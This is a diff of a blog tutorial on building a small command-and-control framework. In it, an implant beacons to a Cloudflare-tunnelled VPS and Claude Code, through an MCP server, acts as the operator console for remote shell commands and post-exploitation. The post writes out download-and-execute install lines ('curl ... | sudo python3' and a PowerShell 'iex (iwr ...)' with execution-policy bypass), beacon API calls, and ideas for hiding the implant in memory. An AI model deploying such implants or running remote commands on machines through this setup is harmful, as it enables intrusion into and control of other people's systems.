@@ -67,9 +67,9 @@ That's just a very simplistic overview, but honestly, the sky's the limit.  All 
 
 Three moving parts:
 
-- **listener.py** -- Flask app on the VPS. Handles agent enrollment, beaconing, and task dispatch. Also manages the MCP subprocess lifecycle.
-- **svc.py** -- The agent. Runs on target machines. Phones home every second, executes queued tasks, returns results.
-- **remote_agent_server.py** -- FastMCP server. Exposes operator tools to Claude Code over HTTP.
+- **listener.py**: Flask app on the VPS. Handles agent enrollment, beaconing, and task dispatch. Also manages the MCP subprocess lifecycle.
+- **svc.py**: The agent. Runs on target machines. Phones home every second, executes queued tasks, returns results.
+- **remote_agent_server.py**: FastMCP server. Exposes operator tools to Claude Code over HTTP.
 
 Everything communicates over HTTPS through named Cloudflare tunnels, so the VPS IP is never exposed and hostnames never change even if the VPS reboots.
 
@@ -147,9 +147,9 @@ cloudflared tunnel route dns remote-agent mcp-vps.yourdomain.com
 cloudflared tunnel route dns remote-agent init-vps.yourdomain.com
 ```
 
-The listener and init endpoints both point to port 8080 but are routed by hostname. This split lets us apply different Cloudflare WAF rules to each -- agents can always reach `/c2/beacon` on agent-vps, but the MCP endpoint (mcp-vps) gets locked down to your operator IP only.
+The listener and init endpoints both point to port 8080 but are routed by hostname. This split lets us apply different Cloudflare WAF rules to each.  Agents can always reach `/c2/beacon` on agent-vps, but the MCP endpoint (mcp-vps) gets locked down to your operator IP only.
 
-One `cloudflared` process handles all three subdomains from one outbound connection. The VPS has zero open inbound ports. No firewall rules to manage, no SSL certificates to renew -- Cloudflare handles TLS termination at their edge.
+One `cloudflared` process handles all three subdomains from one outbound connection. The VPS has zero open inbound ports. No firewall rules to manage, no SSL certificates to renew.  Cloudflare handles TLS termination at their edge.
 
 Rather than running cloudflared as a separate service, `listener.py` spawns it in a background thread on startup, so when systemd starts the listener, the tunnel comes up with it automatically.
 
@@ -176,7 +176,7 @@ INIT_URL      = f"https://init-{AGENT_ID}.{DOMAIN}"
 
 Generate both secrets with: `python3 -c "import secrets; print(secrets.token_urlsafe(32))"`
 
-`SECRET` authenticates every operator API call and every agent beacon. `ENROLL_KEY` gates access to the agent files served over HTTP (`/svc.py`, `/install.py`, `/bootstrap.ps1`). Agents never store `SECRET` or `LISTENER_URL` on disk -- they only know `INIT_URL` and `ENROLL_KEY`. The real credentials are handed to the agent at runtime by the enrollment endpoint.
+`SECRET` authenticates every operator API call and every agent beacon. `ENROLL_KEY` gates access to the agent files served over HTTP (`/svc.py`, `/install.py`, `/bootstrap.ps1`). Agents never store `SECRET` or `LISTENER_URL` on disk.  They only know `INIT_URL` and `ENROLL_KEY`. The real credentials are handed to the agent at runtime by the enrollment endpoint.
 
 ---
 
@@ -188,19 +188,19 @@ Generate both secrets with: `python3 -c "import secrets; print(secrets.token_url
 
 **Three tables:**
 
-- **`agents`** -- upsert table. Each beacon writes the agent's current hostname, OS, username, and IP. The `last_seen` timestamp determines online/offline status: anything that beaconed within the last 30 seconds is considered online.
+- **`agents`**: upsert table. Each beacon writes the agent's current hostname, OS, username, and IP. The `last_seen` timestamp determines online/offline status: anything that beaconed within the last 30 seconds is considered online.
 
-- **`tasks`** -- a queue with explicit status transitions. A task starts as `pending`, gets atomically moved to `claimed` when an agent picks it up via `pop_tasks()`, and becomes `done` when the result comes back. The atomic claim prevents a race where two rapid beacons both pick up the same task.
+- **`tasks`**: a queue with explicit status transitions. A task starts as `pending`, gets atomically moved to `claimed` when an agent picks it up via `pop_tasks()`, and becomes `done` when the result comes back. The atomic claim prevents a race where two rapid beacons both pick up the same task.
 
-- **`results`** -- stores output and exit code from each completed task, keyed by `task_id`. The MCP server polls this table every 500ms after queuing a task, waiting for the row to appear.
+- **`results`**: stores output and exit code from each completed task, keyed by `task_id`. The MCP server polls this table every 500ms after queuing a task, waiting for the row to appear.
 
 **The flow end to end.** When you type "run ipconfig on the Windows agent" in Claude Code:
 
-1. MCP server calls `queue_task()` -- inserts a row into `tasks` with status `pending`
+1. MCP server calls `queue_task()`: inserts a row into `tasks` with status `pending`
 2. Flask listener wakes the parked beacon via `threading.Event`
-3. Agent's next beacon calls `pop_tasks()` -- atomically claims the row
+3. Agent's next beacon calls `pop_tasks()`: atomically claims the row
 4. Agent executes the command, bundles the result into the next beacon
-5. Listener calls `store_results()` -- inserts a row into `results`, marks task `done`
+5. Listener calls `store_results()`: inserts a row into `results`, marks task `done`
 6. MCP server's polling loop finds the result row and returns output to Claude Code
 
 The entire round trip takes 1 to 2 seconds under normal conditions, entirely mediated by SQLite reads and writes.
@@ -211,11 +211,11 @@ The entire round trip takes 1 to 2 seconds under normal conditions, entirely med
 
 `listener.py` is the core of the VPS side. It has three distinct responsibilities:
 
-**Agent enrollment (`/init`).** Agents POST their ID plus an HMAC-SHA256 token derived from `ENROLL_KEY`. The listener verifies the HMAC and, if valid, hands back the real `LISTENER_URL` and `SECRET`. Nothing sensitive is stored on disk on the agent. If you burn an agent binary on a target, the attacker gets an enrollment key and a staging URL -- not your active C2 address. Rate limiting (60 enrollments per IP per hour) prevents `/init` from being hammered.
+**Agent enrollment (`/init`).** Agents POST their ID plus an HMAC-SHA256 token derived from `ENROLL_KEY`. The listener verifies the HMAC and, if valid, hands back the real `LISTENER_URL` and `SECRET`. Nothing sensitive is stored on disk on the agent. If you burn an agent binary on a target, the attacker gets an enrollment key and a staging URL.  Not your active C2 address. Rate limiting (60 enrollments per IP per hour) prevents `/init` from being hammered.
 
-**The beacon loop (`/c2/beacon`).** This is the core C2 channel. Agents POST here carrying their system info plus completed task results. The listener writes metadata to SQLite, stores results, then checks for queued tasks. If there are none, it parks the request on a `threading.Event` for up to 15 seconds -- this is long polling. When a task gets queued through Claude Code, `ev.set()` wakes the parked beacon immediately. Task delivery feels instant from the operator side while the agent only makes ~4 requests per minute instead of 60.
+**The beacon loop (`/c2/beacon`).** This is the core C2 channel. Agents POST here carrying their system info plus completed task results. The listener writes metadata to SQLite, stores results, then checks for queued tasks. If there are none, it parks the request on a `threading.Event` for up to 15 seconds.  This is long polling. When a task gets queued through Claude Code, `ev.set()` wakes the parked beacon immediately. Task delivery feels instant from the operator side while the agent only makes ~4 requests per minute instead of 60.
 
-**MCP subprocess lifecycle (`/mcp/start`, `/mcp/stop`, `/mcp/status`).** The MCP server runs as a child process of the listener, started on demand via authenticated POST. Both processes share the same `c2.db` -- the MCP server writes task rows, the listener delivers them on the next beacon. The MCP server can crash and restart without losing queued work.
+**MCP subprocess lifecycle (`/mcp/start`, `/mcp/stop`, `/mcp/status`).** The MCP server runs as a child process of the listener, started on demand via authenticated POST. Both processes share the same `c2.db`:  the MCP server writes task rows, the listener delivers them on the next beacon. The MCP server can crash and restart without losing queued work.
 
 Key routes at a glance:
 
@@ -235,7 +235,7 @@ Key routes at a glance:
 
 ## The MCP Server (remote_agent_server.py)
 
-This is what Claude Code talks to. It's built on [FastMCP](https://github.com/jlowin/fastmcp) -- a decorator-based Python MCP framework that handles all the protocol plumbing.
+This is what Claude Code talks to. It's built on [FastMCP](https://github.com/jlowin/fastmcp).  This is a decorator-based Python MCP framework that handles all the protocol plumbing.
 
 Each operator tool is a decorated function. FastMCP registers it, generates the schema, and handles serialization:
 
@@ -248,7 +248,7 @@ async def run_shell(agent_id: str, command: str, timeout: float = 30) -> str:
     return await _queue_and_wait(agent_id, "shell", {"command": command}, timeout=timeout)
 ```
 
-The core mechanism is `_queue_and_wait()` -- it writes a task to SQLite, then polls the results table every 500ms until the agent completes it or it times out:
+The core mechanism is `_queue_and_wait()`.  It writes a task to SQLite, then polls the results table every 500ms until the agent completes it or it times out:
 
 ```python
 async def _queue_and_wait(agent_id, task_type, payload, timeout=30):
@@ -329,7 +329,7 @@ while True:
         backoff = min(backoff * 2, MAX_BACKOFF)
 ```
 
-Two things here that are easy to miss. `except BaseException` (not `Exception`) is intentional -- `KeyboardInterrupt` and `SystemExit` are not subclasses of `Exception`, so catching `Exception` only would silently swallow a Ctrl+C and keep the agent running. And the `else: time.sleep(BEACON_INTERVAL)` on the no-tasks branch is critical -- without it, when the long poll returns empty the agent hammers the beacon endpoint in a tight loop.
+Two things here that are easy to miss. `except BaseException` (not `Exception`) is intentional.  `KeyboardInterrupt` and `SystemExit` are not subclasses of `Exception`, so catching `Exception` only would silently swallow a Ctrl+C and keep the agent running. And the `else: time.sleep(BEACON_INTERVAL)` on the no-tasks branch is critical.  Without it, when the long poll returns empty the agent hammers the beacon endpoint in a tight loop.
 
 Results are bundled into the next beacon rather than making a separate HTTP call. Each beacon is one POST: check in, receive tasks, submit results from the previous cycle.
 
@@ -395,7 +395,7 @@ apt-get install -y cron && systemctl enable cron && systemctl start cron
 curl -s "https://init-vps.yourdomain.com/install.py?enroll=your_enroll_key" | sudo python3
 ```
 
-**Windows (no Python required -- uses portable embeddable Python):**
+**Windows (no Python required.  Uses portable embeddable Python):**
 ```powershell
 powershell -ep bypass -c "iex (iwr 'https://init-vps.yourdomain.com/bootstrap.ps1?enroll=your_enroll_key' -UseBasicParsing).Content"
 ```
@@ -416,13 +416,13 @@ The agent generates a unique ID on first run (`<hostname>-sys-<4 random chars>`)
 
 ## Operating Without Claude
 
-Before MCP mode, it's worth knowing how to interact with the C2 directly. MCP and the GUI are conveniences -- underneath everything is a plain HTTP API you can hit from any terminal. This matters when you're on a machine without Claude Code, scripting from a CI box, or just want to sanity-check the server is alive.
+Before MCP mode, it's worth knowing how to interact with the C2 directly. MCP and the GUI are conveniences.  Underneath everything is a plain HTTP API you can hit from any terminal. This matters when we're on a machine without Claude Code, scripting from a CI box, or just want to sanity-check the server is alive.
 
 ### commander.py CLI
 
 `commander.py` is a Python CLI that wraps the HTTP API. It runs on your operator machine (not the VPS) and only requires `pip install requests`.
 
-**Run a command directly on the VPS from your attacker machine** (not on an agent -- this runs on the VPS itself):
+**Run a command directly on the VPS from your attacker machine** (not on an agent.  This runs on the VPS itself):
 ```powershell
 py commander.py execute "whoami"
 py commander.py execute "ps aux"
@@ -476,7 +476,7 @@ curl -s "https://agent-vps.yourdomain.com/c2/results/workstation-sys-ab12?secret
 {"status": "ok", "result": {"output": "workstation\\alice", "exit_code": 0}}
 ```
 
-If the agent hasn't beaconed yet you'll get `{"status": "pending"}` -- just poll again in a few seconds.
+If the agent hasn't beaconed yet you'll get `{"status": "pending"}`   just poll again in a few seconds.
 
 **List all registered agents:**
 ```bash
@@ -590,14 +590,14 @@ The **Ask Claude** button is the part I'm most happy with. It opens a dialog wit
 
 A few things that would make this more production-hardened:
 
-- **Encrypted payloads** -- tasks and results are currently plaintext JSON. HTTPS handles transport encryption but payload-level encryption would protect against a compromised broker SQLite.
-- **Implant hardening** -- `svc.py` sits on disk in plaintext. For anything beyond a lab you'd want it packed or loaded from memory.
-- **The Obvious - Add More Commands!** -- I just threw this together to demonstrate the capabilities of Claude in managing a mimimal C2 setup.  If I really grew this out more, I'd add privilege escalation, BOF options, etc.
+- **Encrypted payloads**: tasks and results are currently plaintext JSON. HTTPS handles transport encryption but payload-level encryption would protect against a compromised broker SQLite.
+- **Implant hardening**: `svc.py` sits on disk in plaintext. For anything beyond a lab you'd want it packed or loaded from memory.
+- **The Obvious - Add More Commands!**: I just threw this together to demonstrate the capabilities of Claude in managing a mimimal C2 setup.  If I really grew this out more, I'd add privilege escalation, BOF options, etc.
 ---
 
 ## Wrapping Up
 
-Having Claude Code as your operator console means analysis, pivoting, and post-exploitation research all happen in the same context. You run a command, get output, ask a question about it, and follow up -- all in one flowing session. That's the part I didn't fully anticipate when I started building this, and it's the part I'd keep even if I ditched everything else.
+Having Claude Code as your operator console means analysis, pivoting, and post-exploitation research all happen in the same context. You run a command, get output, ask a question about it, and follow up.  All in one flowing session. That's the part I didn't fully anticipate when I started building this, and it's the part I'd keep even if I ditched everything else.
 
 All Source Code is in the repo, linked below. If you have questions drop them in the comments or hit me up on Discord
 
